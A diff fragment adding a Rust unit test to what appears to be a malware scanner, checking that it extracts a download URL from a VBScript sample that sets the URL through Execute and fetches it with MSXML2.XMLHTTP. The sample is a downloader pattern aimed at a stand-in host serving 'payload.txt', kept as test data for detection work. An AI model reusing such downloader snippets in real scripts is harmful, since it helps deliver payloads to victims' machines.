@@ -12214,6 +12214,28 @@ http.Send"#;
     }
 
     #[test]
+    fn vbs_xmlhttp_url_extracted_from_execute_assignment() {
+        let mut env = Environment::new(&Config::default());
+        let vbs = br#"Dim u, http
+Execute "u = ""http://vbs-execute.example/payload.txt"""
+Set http = CreateObject("MSXML2.XMLHTTP")
+http.Open "GET", u, False
+http.Send"#;
+        env.all_extracted_vbs.push(vbs.to_vec());
+        crate::vbs_scan::scan_vbs_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "http://vbs-execute.example/payload.txt"
+            )
+        });
+        assert!(
+            has,
+            "no Download trait from VBS Execute assignment URL: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn vbs_xmlhttp_url_extracted_from_replace_wrapper() {
         let mut env = Environment::new(&Config::default());
         let vbs = br#"Dim u, http
